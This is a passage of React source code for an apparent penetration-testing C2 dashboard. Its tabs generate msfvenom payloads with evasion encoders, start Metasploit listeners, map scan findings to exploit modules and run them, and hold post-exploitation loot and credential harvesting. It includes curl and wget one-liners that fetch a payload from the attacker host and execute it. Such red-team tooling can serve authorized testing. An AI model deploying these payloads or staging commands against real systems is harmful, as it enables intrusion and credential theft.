                                  ? <span style={{ color: 'var(--crit)' }}>{entry.error}</span>
                                  : entry.output
                                    ? <pre style={{ fontSize: 10, color: 'var(--fg-2)', whiteSpace: 'pre-wrap', wordBreak: 'break-all', maxHeight: 192, overflowY: 'auto', fontFamily: 'var(--font-mono)', lineHeight: 1.5 }}>{entry.output}</pre>
                                    : <span style={{ color: 'var(--fg-4)', fontStyle: 'italic' }}>No output</span>}
                            </div>
                          )}
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>
        )}

        {/* Payloads tab */}
        {activeTab === 'payloads' && (
          <div style={{ flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: 16 }}>
            <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, padding: 20 }}>
              <h3 style={{ fontSize: 13, fontWeight: 600, color: 'var(--fg)', marginBottom: 16, display: 'flex', alignItems: 'center', gap: 8 }}>
                <Icon name="layers" size={14} style={{ color: 'var(--accent)' }} /> Generate Payload (msfvenom)
              </h3>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16 }}>
                <div style={{ gridColumn: '1 / -1' }}>
                  <label style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>Payload</label>
                  <select style={{ ...inputClass, background: 'var(--bg)' }} value={selPayload} onChange={e => {
                    setSelPayload(e.target.value)
                    const p = payloads.find(x => x.value === e.target.value)
                    if (p) setPayloadFmt(p.formats[0])
                  }}>
                    <option value="">Select payload...</option>
                    {payloads.map(p => <option key={p.value} value={p.value}>{p.label}</option>)}
                  </select>
                </div>
                <div>
                  <label style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>LHOST</label>
                  <input value={lhost} onChange={e => setLhost(e.target.value)} style={inputClass} placeholder="192.168.1.100" />
                </div>
                <div>
                  <label style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>LPORT</label>
                  <input value={lport} onChange={e => setLport(e.target.value)} style={inputClass} placeholder="4444" />
                </div>
                <div>
                  <label style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>Format</label>
                  <select style={{ ...inputClass, background: 'var(--bg)' }} value={payloadFmt} onChange={e => setPayloadFmt(e.target.value)}>
                    {(payloads.find(p => p.value === selPayload)?.formats || ['elf','exe','raw']).map(f => (
                      <option key={f} value={f}>{f}</option>
                    ))}
                  </select>
                </div>
                {/* Evasion options */}
                <div style={{ gridColumn: '1 / -1', borderTop: rule, paddingTop: 12, marginTop: 4 }}>
                  <div style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 8, fontWeight: 500 }}>Evasion Options</div>
                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 12 }}>
                    <div>
                      <label style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>Encoder</label>
                      <select style={{ ...inputClass, background: 'var(--bg)' }} value={payloadEncoder} onChange={e => setPayloadEncoder(e.target.value)}>
                        <option value="none">None</option>
                        <optgroup label="x86">
                          <option value="x86/shikata_ga_nai">shikata_ga_nai (polymorphic)</option>
                          <option value="x86/countdown">countdown</option>
                          <option value="x86/jmp_call_additive">jmp_call_additive</option>
                          <option value="x86/fnstenv_mov">fnstenv_mov</option>
                          <option value="x86/bloxor">bloxor (xor)</option>
                          <option value="x86/alpha_upper">alpha_upper (alphanumeric)</option>
                          <option value="x86/alpha_mixed">alpha_mixed (alphanumeric)</option>
                        </optgroup>
                        <optgroup label="x64">
                          <option value="x64/xor">xor</option>
                          <option value="x64/xor_dynamic">xor_dynamic</option>
                          <option value="x64/zutto_dekiru">zutto_dekiru</option>
                        </optgroup>
                        <optgroup label="cmd">
                          <option value="cmd/powershell_base64">powershell_base64</option>
                        </optgroup>
                      </select>
                    </div>
                    <div>
                      <label style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>Iterations</label>
                      <input
                        type="number"
                        min="1"
                        max="20"
                        value={payloadIterations}
                        onChange={e => setPayloadIterations(e.target.value)}
                        disabled={payloadEncoder === 'none'}
                        style={{ ...inputClass, opacity: payloadEncoder === 'none' ? 0.4 : 1 }}
                        placeholder="1"
                      />
                    </div>
                    <div>
                      <label style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>Bad chars</label>
                      <input
                        value={payloadBadChars}
                        onChange={e => setPayloadBadChars(e.target.value)}
                        style={inputClass}
                        placeholder="\x00\x0a"
                      />
                    </div>
                  </div>
                </div>
                <div style={{ gridColumn: '1 / -1', display: 'flex', alignItems: 'center', gap: 8, paddingTop: 4 }}>
                  <input
                    id="auto-listener"
                    type="checkbox"
                    checked={autoStartListener}
                    onChange={e => setAutoStartListener(e.target.checked)}
                    style={{ width: 14, height: 14, cursor: 'pointer', accentColor: 'var(--accent)' }}
                  />
                  <label htmlFor="auto-listener" style={{ fontSize: 11, color: 'var(--fg-2)', cursor: 'pointer', userSelect: 'none' }}>
                    Auto-start listener after generating
                  </label>
                </div>
                <div style={{ display: 'flex', alignItems: 'flex-end' }}>
                  <button
                    onClick={handleGeneratePayload}
                    disabled={generatingPayload || !selPayload || !lhost}
                    style={{
                      width: '100%', padding: '8px 0', borderRadius: 4, background: 'var(--accent)', border: 'none',
                      color: '#0d0c0a', fontSize: 13, fontWeight: 600, cursor: (generatingPayload || !selPayload || !lhost) ? 'not-allowed' : 'pointer',
                      opacity: (generatingPayload || !selPayload || !lhost) ? 0.4 : 1, display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
                      fontFamily: 'var(--font-sans)',
                    }}
                  >
                    {generatingPayload ? <Icon name="refresh" size={14} className="animate-spin" /> : <Icon name="download" size={14} />}
                    {generatingPayload ? 'Generating...' : 'Download Payload'}
                  </button>
                </div>
              </div>

              {/* One-liner staging commands */}
              {selPayload && lhost && lport && (
                <div style={{ marginTop: 16, display: 'flex', flexDirection: 'column', gap: 8 }}>
                  <div style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4 }}>Quick staging commands:</div>
                  {[
                    { label: 'Python HTTP server', cmd: `python3 -m http.server 8080` },
                    { label: 'curl download', cmd: `curl http://${lhost}:8080/payload.${payloadFmt} -o /tmp/p && chmod +x /tmp/p && /tmp/p` },
                    { label: 'wget download', cmd: `wget http://${lhost}:8080/payload.${payloadFmt} -O /tmp/p && chmod +x /tmp/p && /tmp/p` },
                  ].map(item => (
                    <div key={item.label} style={{ display: 'flex', alignItems: 'center', gap: 8, background: 'var(--bg)', borderRadius: 4, padding: '6px 12px', border: rule }}>
                      <span style={{ fontSize: 10, color: 'var(--fg-4)', width: 112, flexShrink: 0 }}>{item.label}</span>
                      <code style={{ flex: 1, fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--fg-2)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{item.cmd}</code>
                      <button onClick={() => copyText(item.cmd, item.label)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', flexShrink: 0, padding: 0 }}>
                        {copied === item.label ? <Icon name="check" size={12} style={{ color: 'var(--ok)' }} /> : <Icon name="copy" size={12} />}
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        )}

        {/* Listeners tab */}
        {activeTab === 'listeners' && (
          <div style={{ flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: 16 }}>
            {/* Start listener form */}
            <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, padding: 20 }}>
              <h3 style={{ fontSize: 13, fontWeight: 600, color: 'var(--fg)', marginBottom: 16, display: 'flex', alignItems: 'center', gap: 8 }}>
                <Icon name="radio" size={14} style={{ color: 'var(--accent)' }} /> Start Listener (multi/handler)
              </h3>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: 12, alignItems: 'flex-end' }}>
                <div style={{ gridColumn: '1 / -1' }}>
                  <label style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>Payload</label>
                  <select style={{ ...inputClass, background: 'var(--bg)' }} value={listenerPayload} onChange={e => setListenerPayload(e.target.value)}>
                    {payloads.map(p => <option key={p.value} value={p.value}>{p.label}</option>)}
                  </select>
                </div>
                <div>
                  <label style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>LHOST</label>
                  <input value={listenerLhost} onChange={e => setListenerLhost(e.target.value)} style={inputClass} placeholder="0.0.0.0" />
                </div>
                <div>
                  <label style={{ fontSize: 11, color: 'var(--fg-3)', marginBottom: 4, display: 'block' }}>LPORT</label>
                  <input value={listenerLport} onChange={e => setListenerLport(e.target.value)} style={inputClass} placeholder="4444" />
                </div>
                <button
                  onClick={handleStartListener}
                  disabled={startingListener || !msfStatus.connected}
                  style={{
                    padding: '8px 0', borderRadius: 4, background: 'var(--ok)', border: 'none',
                    color: '#0d0c0a', fontSize: 13, fontWeight: 600,
                    cursor: (startingListener || !msfStatus.connected) ? 'not-allowed' : 'pointer',
                    opacity: (startingListener || !msfStatus.connected) ? 0.4 : 1,
                    display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
                    fontFamily: 'var(--font-sans)',
                  }}
                >
                  {startingListener ? <Icon name="refresh" size={14} className="animate-spin" /> : <Icon name="play" size={14} />}
                  Start
                </button>
              </div>
            </div>

            {/* Active listeners */}
            <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, overflow: 'hidden' }}>
              <div style={{ padding: '10px 16px', borderBottom: rule, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
                  Active Jobs & Listeners {listeners.length > 0 && <span style={{ color: 'var(--accent)', marginLeft: 4 }}>({listeners.length})</span>}
                </span>
                <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                  {msfStatus.connected && (
                    <button
                      onClick={async () => {
                        await fetch(`${getApiBase()}/c2/jobs/all`, { method: 'DELETE' })
                        loadListeners()
                      }}
                      style={{ fontSize: 11, color: 'var(--crit)', background: 'none', border: 'none', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 4, fontFamily: 'var(--font-sans)' }}
                      title="Kill all MSF jobs"
                    >
                      <Icon name="x" size={11} /> Kill All
                    </button>
                  )}
                  <button onClick={loadListeners} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-3)', padding: 0 }}>
                    <Icon name="refresh" size={13} />
                  </button>
                </div>
              </div>
              {listeners.length === 0 ? (
                <div style={{ textAlign: 'center', color: 'var(--fg-4)', padding: '32px 0', fontSize: 11 }}>No active listeners</div>
              ) : listeners.map(l => (
                <div key={l.job_id} style={{ display: 'flex', alignItems: 'center', gap: 16, padding: '10px 16px', borderBottom: rule }}>
                  <span style={{ position: 'relative', display: 'flex', width: 8, height: 8 }}>
                    <span className="animate-ping" style={{ position: 'absolute', display: 'inline-flex', width: '100%', height: '100%', borderRadius: '50%', background: 'var(--ok)', opacity: 0.75 }} />
                    <span style={{ position: 'relative', display: 'inline-flex', borderRadius: '50%', width: 8, height: 8, background: 'var(--ok)' }} />
                  </span>
                  <div style={{ flex: 1 }}>
                    <div style={{ fontSize: 11, color: 'var(--fg)' }}>{l.name}</div>
                    <div style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)' }}>
                      {l.datastore?.PAYLOAD} · {l.datastore?.LHOST}:{l.datastore?.LPORT}
                    </div>
                  </div>
                  <span style={{ fontSize: 10, color: 'var(--fg-4)' }}>Job #{l.job_id}</span>
                  <button onClick={() => handleStopListener(l.job_id)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', padding: 0 }}>
                    <Icon name="x" size={14} />
                  </button>
                </div>
              ))}
            </div>

            {/* Sliver C2 section */}
            <SliverPanel />
          </div>
        )}

        {/* Attack Plan tab */}
        {activeTab === 'attack' && (
          <div style={{ flex: 1, display: 'flex', flexDirection: 'column', minHeight: 0, gap: 12, overflowY: 'auto' }}>
            {/* Header */}
            <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, padding: 16, display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 16, flexShrink: 0 }}>
              <div>
                <h3 style={{ fontSize: 13, fontWeight: 600, color: 'var(--fg)', display: 'flex', alignItems: 'center', gap: 8 }}>
                  <Icon name="target" size={14} style={{ color: 'var(--crit)' }} /> Attack Plan
                </h3>
                <p style={{ fontSize: 11, color: 'var(--fg-3)', marginTop: 2 }}>
                  Maps scan findings to Metasploit modules using CVE lookups and service fingerprinting.
                </p>
              </div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 12, flexShrink: 0 }}>
                {attackPlan && (
                  <span style={{ fontSize: 11, color: 'var(--fg-3)' }}>
                    {attackPlan.matched_count} match{attackPlan.matched_count !== 1 ? 'es' : ''} from {attackPlan.finding_count} findings
                  </span>
                )}
                <button
                  onClick={handleGenerateAttackPlan}
                  disabled={generatingAttack || !projectId}
                  style={{
                    display: 'flex', alignItems: 'center', gap: 8, padding: '7px 16px', borderRadius: 4,
                    background: 'rgba(232,64,64,0.15)', border: '1px solid rgba(232,64,64,0.3)',
                    color: 'var(--crit)', fontSize: 13, fontWeight: 500,
                    cursor: (generatingAttack || !projectId) ? 'not-allowed' : 'pointer',
                    opacity: (generatingAttack || !projectId) ? 0.4 : 1,
                    fontFamily: 'var(--font-sans)',
                  }}
                >
                  {generatingAttack
                    ? <><Icon name="refresh" size={13} className="animate-spin" /> Scanning...</>
                    : <><Icon name="target" size={13} /> {attackPlan ? 'Refresh' : 'Analyze'}</>
                  }
                </button>
              </div>
            </div>

            {attackPlanError && (
              <p style={{ fontSize: 11, color: 'var(--crit)', background: 'rgba(232,64,64,0.08)', border: '1px solid rgba(232,64,64,0.3)', borderRadius: 4, padding: '8px 12px', flexShrink: 0 }}>{attackPlanError}</p>
            )}

            {attackPlan && attackPlan.recommendations.length === 0 && (
              <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '48px 0', color: 'var(--fg-4)' }}>
                <Icon name="shield" size={36} style={{ marginBottom: 12, opacity: 0.2 }} />
                <p style={{ fontSize: 13 }}>No matching modules found</p>
                <p style={{ fontSize: 11, marginTop: 4, color: 'var(--fg-4)' }}>Run nmap/nikto scans to discover services and vulnerabilities first</p>
              </div>
            )}

            {attackPlan && attackPlan.recommendations.map((rec, i) => {
              const confStyle = rec.confidence === 'high'
                ? { color: 'var(--crit)', border: '1px solid rgba(232,64,64,0.3)', background: 'rgba(232,64,64,0.1)' }
                : rec.confidence === 'medium'
                ? { color: 'var(--accent)', border: '1px solid rgba(240,168,58,0.3)', background: 'rgba(240,168,58,0.1)' }
                : { color: 'var(--fg-3)', border: '1px solid rgba(100,116,139,0.3)', background: 'rgba(100,116,139,0.1)' }
              const sevColor = rec.finding_severity === 'critical' ? 'var(--crit)'
                : rec.finding_severity === 'high' ? '#f97316'
                : rec.finding_severity === 'medium' ? 'var(--accent)'
                : 'var(--fg-3)'
              return (
                <div key={i} style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, padding: 16, flexShrink: 0 }}>
                  <div style={{ display: 'flex', alignItems: 'flex-start', gap: 12, marginBottom: 12 }}>
                    <span style={{ fontSize: 10, fontWeight: 700, padding: '2px 8px', borderRadius: 4, textTransform: 'uppercase', flexShrink: 0, marginTop: 2, ...confStyle }}>
                      {rec.confidence}
                    </span>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <code style={{ fontSize: 13, fontFamily: 'var(--font-mono)', color: 'var(--fg)' }}>{rec.module}</code>
                      {rec.finding_title && (
                        <p style={{ fontSize: 11, color: 'var(--fg-3)', marginTop: 2, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                          via <span style={{ fontWeight: 500, color: sevColor }}>{rec.finding_title}</span>
                          <span style={{ color: 'var(--fg-4)', margin: '0 4px' }}>·</span>
                          <span style={{ color: 'var(--fg-4)' }}>{rec.match_reason}</span>
                        </p>
                      )}
                    </div>
                    <button
                      onClick={() => copyText(rec.module, `mod-${i}`)}
                      style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', flexShrink: 0, padding: 0 }}
                      title="Copy module path"
                    >
                      {copied === `mod-${i}` ? <Icon name="check" size={13} style={{ color: 'var(--ok)' }} /> : <Icon name="copy" size={13} />}
                    </button>
                  </div>

                  <p style={{ fontSize: 11, color: 'var(--fg-2)', marginBottom: 12 }}>{rec.description}</p>

                  {/* Options — editable */}
                  {Object.keys(rec.options).length > 0 && (
                    <div style={{ background: 'var(--bg)', borderRadius: 4, padding: 12, border: rule, marginBottom: 12, fontFamily: 'var(--font-mono)', fontSize: 11, display: 'flex', flexDirection: 'column', gap: 6 }}>
                      <div style={{ fontSize: 10, color: 'var(--fg-4)', textTransform: 'uppercase', letterSpacing: '0.05em', marginBottom: 8 }}>msf options</div>
                      {Object.entries(rec.options).map(([k, v]) => (
                        <div key={k} style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                          <span style={{ color: 'var(--accent)', width: 96, flexShrink: 0 }}>set {k}</span>
                          <input
                            style={{ flex: 1, background: 'transparent', borderBottom: rule, borderTop: 'none', borderLeft: 'none', borderRight: 'none', outline: 'none', color: 'var(--fg)', padding: '2px 0', fontFamily: 'var(--font-mono)', fontSize: 11 }}
                            defaultValue={v}
                            onChange={e => { rec.options[k] = e.target.value }}
                          />
                        </div>
                      ))}
                      {rec.payload && (
                        <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                          <span style={{ color: 'var(--accent)', width: 96, flexShrink: 0 }}>set PAYLOAD</span>
                          <input
                            style={{ flex: 1, background: 'transparent', borderBottom: rule, borderTop: 'none', borderLeft: 'none', borderRight: 'none', outline: 'none', color: 'var(--fg)', padding: '2px 0', fontFamily: 'var(--font-mono)', fontSize: 11 }}
                            defaultValue={rec.payload}
                            onChange={e => { rec.payload = e.target.value }}
                          />
                        </div>
                      )}
                    </div>
                  )}

                  {/* Post modules */}
                  {rec.post_modules.length > 0 && (
                    <div style={{ display: 'flex', flexWrap: 'wrap', gap: 6, marginBottom: 12, alignItems: 'center' }}>
                      <span style={{ fontSize: 10, color: 'var(--fg-4)' }}>post:</span>
                      {rec.post_modules.map(pm => (
                        <span key={pm} style={{ fontSize: 10, fontFamily: 'var(--font-mono)', color: '#a78bfa', background: 'rgba(167,139,250,0.1)', border: '1px solid rgba(167,139,250,0.2)', padding: '1px 8px', borderRadius: 4 }}>
                          {pm}
                        </span>
                      ))}
                    </div>
                  )}

                  {/* Run button + result */}
                  {!rec.module.startsWith('—') && (
                    <div style={{ display: 'flex', flexDirection: 'column', gap: 8, paddingTop: 8, borderTop: rule }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <button
                        onClick={() => handleRunModule(rec, i)}
                        disabled={!msfStatus.connected || runningModule === i}
                        style={{
                          display: 'flex', alignItems: 'center', gap: 6, padding: '6px 12px', borderRadius: 4, fontSize: 11, fontWeight: 500,
                          background: 'rgba(232,64,64,0.1)', border: '1px solid rgba(232,64,64,0.3)', color: 'var(--crit)',
                          cursor: (!msfStatus.connected || runningModule === i) ? 'not-allowed' : 'pointer',
                          opacity: (!msfStatus.connected || runningModule === i) ? 0.4 : 1,
                          fontFamily: 'var(--font-sans)',
                        }}
                        title={!msfStatus.connected ? 'Connect to Metasploit first' : 'Run this module'}
                      >
                        {runningModule === i
                          ? <><Icon name="refresh" size={11} className="animate-spin" /> Running...</>
                          : <><Icon name="play" size={11} /> Run</>
                        }
                      </button>
                      {moduleResults[i] && (
                        moduleResults[i].error ? (
                          <span style={{ fontSize: 11, color: 'var(--crit)' }}>{moduleResults[i].error}</span>
                        ) : moduleResults[i].new_session_id ? (
                          <span style={{ fontSize: 11, color: 'var(--ok)', display: 'flex', alignItems: 'center', gap: 6 }}>
                            <span style={{ position: 'relative', display: 'flex', width: 8, height: 8 }}>
                              <span className="animate-ping" style={{ position: 'absolute', display: 'inline-flex', width: '100%', height: '100%', borderRadius: '50%', background: 'var(--ok)', opacity: 0.75 }} />
                              <span style={{ position: 'relative', display: 'inline-flex', borderRadius: '50%', width: 8, height: 8, background: 'var(--ok)' }} />
                            </span>
                            Session opened (MSF #{moduleResults[i].new_session_id})
                          </span>
                        ) : moduleResults[i].timed_out ? (
                          <span style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
                            <span style={{ fontSize: 11, color: 'var(--crit)' }}>
                              No callback received — job{moduleResults[i].job_id ? ` #${moduleResults[i].job_id}` : ''} timed out
                            </span>
                            <button
                              onClick={handleSync}
                              style={{ fontSize: 10, color: 'var(--accent)', background: 'none', border: 'none', cursor: 'pointer', textDecoration: 'underline', fontFamily: 'var(--font-sans)' }}
                            >
                              Sync sessions
                            </button>
                          </span>
                        ) : (
                          <span style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
                            <span style={{ fontSize: 11, color: 'var(--accent)' }}>
                              {rec.module.startsWith('auxiliary/')
                                ? `Scan running${moduleResults[i].job_id ? ` (#${moduleResults[i].job_id})` : ''}…`
                                : `Job started${moduleResults[i].job_id ? ` (#${moduleResults[i].job_id})` : ''} — waiting for callback`
                              }
                            </span>
                            {!rec.module.startsWith('auxiliary/') && (
                              <button
                                onClick={handleSync}
                                style={{ fontSize: 10, color: 'var(--accent)', background: 'none', border: 'none', cursor: 'pointer', textDecoration: 'underline', fontFamily: 'var(--font-sans)' }}
                              >
                                Sync sessions
                              </button>
                            )}
                          </span>
                        )
                      )}
                    </div>
                    {moduleResults[i]?.msf_result && (
                      <pre style={{ fontSize: 10, fontFamily: 'var(--font-mono)', color: 'var(--fg-3)', background: 'var(--bg)', borderRadius: 4, padding: '6px 8px', border: rule, overflowX: 'auto' }}>
                        {JSON.stringify(moduleResults[i].msf_result, null, 2)}
                      </pre>
                    )}
                    </div>
                  )}
                </div>
              )
            })}

            {attackPlan && attackPlan.unmatched_findings.length > 0 && (
              <div style={{ background: 'var(--bg-2)', border: rule, borderRadius: 4, padding: 16, flexShrink: 0 }}>
                <p style={{ fontSize: 10, color: 'var(--fg-4)', textTransform: 'uppercase', letterSpacing: '0.05em', marginBottom: 8 }}>No module match found for:</p>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
                  {attackPlan.unmatched_findings.map((f, i) => (
                    <div key={i} style={{ fontSize: 11, color: 'var(--fg-4)', display: 'flex', alignItems: 'center', gap: 8 }}>
                      <span style={{ width: 6, height: 6, borderRadius: '50%', background: 'var(--fg-4)', flexShrink: 0 }} />
                      {f.title}
                      {f.cve_id && <span style={{ fontFamily: 'var(--font-mono)', color: 'var(--fg-4)' }}>{f.cve_id}</span>}
                    </div>
                  ))}
                </div>
              </div>
            )}

            {!attackPlan && !generatingAttack && (
              <div style={{ flex: 1, background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: 'var(--fg-4)', padding: '64px 0' }}>
                <Icon name="target" size={40} style={{ marginBottom: 12, opacity: 0.2, color: 'var(--crit)' }} />
                <p style={{ fontSize: 13 }}>Select a project and click Analyze</p>
                <p style={{ fontSize: 11, marginTop: 4, color: 'var(--fg-4)' }}>Works best after running nmap and nikto scans</p>
              </div>
            )}
          </div>
        )}

        {/* Loot tab */}
        {activeTab === 'loot' && (
          <div style={{ flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: 12 }}>
            {loot.length === 0 ? (
              <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '64px 0', color: 'var(--fg-4)' }}>
                <Icon name="layers" size={40} style={{ marginBottom: 12, opacity: 0.2, color: 'var(--accent)' }} />
                <p style={{ fontSize: 13 }}>No loot captured yet</p>
                <p style={{ fontSize: 11, marginTop: 4, color: 'var(--fg-4)' }}>Run post-exploitation modules to capture credentials, hashes, and files</p>
              </div>
            ) : loot.map(item => {
              const ls = LOOT_STYLES[item.loot_type] ?? LOOT_STYLES.system_info
              return (
                <div key={item.id} style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, padding: 16 }}>
                  <div style={{ display: 'flex', alignItems: 'flex-start', gap: 12 }}>
                    <span style={{ fontSize: 11, padding: '2px 8px', borderRadius: 4, fontWeight: 600, textTransform: 'uppercase', flexShrink: 0, color: ls.color, border: ls.border, background: ls.background }}>
                      {item.loot_type}
                    </span>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{ fontSize: 13, color: 'var(--fg)', fontWeight: 500 }}>{item.title}</div>
                      {item.source_path && <div style={{ fontSize: 11, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', marginTop: 2 }}>{item.source_path}</div>}
                      <div style={{ fontSize: 11, color: 'var(--fg-4)', marginTop: 2 }}>{new Date(item.captured_at).toLocaleString()}</div>
                    </div>
                    <div style={{ display: 'flex', gap: 4, flexShrink: 0 }}>
                      {item.content && (
                        <>
                          <button onClick={() => copyText(item.content, item.id)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', padding: 4 }}>
                            {copied === item.id ? <Icon name="check" size={13} style={{ color: 'var(--ok)' }} /> : <Icon name="copy" size={13} />}
                          </button>
                          <button onClick={() => setShowLootContent(showLootContent === item.id ? null : item.id)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', padding: 4 }}>
                            {showLootContent === item.id ? <Icon name="eye_off" size={13} /> : <Icon name="eye" size={13} />}
                          </button>
                        </>
                      )}
                      <button onClick={async () => { await fetch(`${getApiBase()}/c2/loot/${item.id}`, { method: 'DELETE' }); loadLoot() }} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', padding: 4 }}>
                        <Icon name="trash" size={13} />
                      </button>
                    </div>
                  </div>
                  {showLootContent === item.id && item.content && (
                    <pre style={{ marginTop: 12, background: 'var(--bg)', borderRadius: 4, padding: 12, fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--fg-2)', overflowX: 'auto', whiteSpace: 'pre-wrap', border: rule, maxHeight: 160, overflowY: 'auto' }}>
                      {item.content}
                    </pre>
                  )}
                </div>
              )
            })}
          </div>
        )}
        {/* Post-Ex tab */}
        {activeTab === 'postex' && (
          <div style={{ flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: 16 }}>
            {!activeSession ? (
              <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '64px 0', color: 'var(--fg-4)' }}>
                <Icon name="check" size={36} style={{ marginBottom: 12, opacity: 0.2 }} />
                <p style={{ fontSize: 13 }}>Select a session to view post-exploitation tools</p>
              </div>
            ) : (
              <>
                {/* Quick actions */}
                <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, padding: 16 }}>
                  <h3 style={{ fontSize: 13, fontWeight: 600, color: 'var(--fg)', marginBottom: 12, display: 'flex', alignItems: 'center', gap: 8 }}>
                    <Icon name="bolt" size={14} style={{ color: 'var(--accent)' }} /> Quick Actions
                    <span style={{ marginLeft: 8, fontSize: 11, fontWeight: 400, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)' }}>{activeSession.remote_host} · {activeSession.session_type}</span>
                  </h3>
                  <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
                    <button
                      onClick={handleAutoprobe}
                      disabled={probing}
                      style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '6px 12px', borderRadius: 4, background: 'rgba(240,168,58,0.08)', border: '1px solid rgba(240,168,58,0.2)', fontSize: 11, color: 'var(--fg-2)', cursor: probing ? 'not-allowed' : 'pointer', opacity: probing ? 0.5 : 1, fontFamily: 'var(--font-sans)' }}
                    >
                      <Icon name="refresh" size={12} className={probing ? 'animate-spin' : ''} />
                      {probing ? 'Probing…' : 'Auto-Probe'}
                    </button>
                    <button
                      onClick={handleHarvestCreds}
                      disabled={harvesting}
                      style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '6px 12px', borderRadius: 4, background: 'rgba(240,168,58,0.08)', border: '1px solid rgba(240,168,58,0.2)', fontSize: 11, color: 'var(--accent)', cursor: harvesting ? 'not-allowed' : 'pointer', opacity: harvesting ? 0.5 : 1, fontFamily: 'var(--font-sans)' }}
                    >
                      {harvesting ? <Icon name="refresh" size={12} className="animate-spin" /> : <Icon name="key" size={12} />}
                      Harvest Creds
                    </button>
                    <button
                      onClick={handleScreenshot}
                      disabled={screenshotting || !activeSession.session_type.includes('meterpreter')}
                      title={!activeSession.session_type.includes('meterpreter') ? 'Requires Meterpreter' : ''}
                      style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '6px 12px', borderRadius: 4, background: 'rgba(180,130,60,0.08)', border: '1px solid rgba(180,130,60,0.2)', fontSize: 11, color: 'var(--med)', cursor: (screenshotting || !activeSession.session_type.includes('meterpreter')) ? 'not-allowed' : 'pointer', opacity: (screenshotting || !activeSession.session_type.includes('meterpreter')) ? 0.4 : 1, fontFamily: 'var(--font-sans)' }}
                    >
                      {screenshotting ? <Icon name="refresh" size={12} className="animate-spin" /> : <Icon name="eye" size={12} />}
                      Screenshot
                    </button>
                    <button
                      onClick={handleUpgrade}
                      disabled={upgrading || activeSession.session_type.includes('meterpreter')}
